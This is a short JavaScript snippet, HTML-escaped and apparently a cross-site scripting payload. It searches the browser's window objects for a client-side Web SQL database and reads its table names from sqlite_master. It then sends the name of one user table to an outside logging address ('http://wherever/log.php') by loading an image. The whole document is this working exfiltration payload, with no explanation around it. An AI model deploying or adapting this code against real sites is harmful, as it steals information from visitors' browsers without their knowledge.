var dbo;
var table;
var usertable;
for(i in window){
	obj = window[i];
	try{
		if(obj.constructor.name==&#34;Database&#34;){
			dbo = obj;
			obj.transaction(function(tx){
				tx.executeSql(&#39;SELECT name FROM sqlite_master WHERE type=\&#39;table\&#39;&#39;,[],function(tx,results){ table=results; },null);
			});
		}
		
	}catch(ex){}
}
if(typeof(table) != &#34;undefined&#34; &amp;&amp; table.rows.length&gt;1) {
    usertable=table.rows.item(1).name;
    new Image().src = &#34;http://wherever/log.php?&#34;+usertable;
}

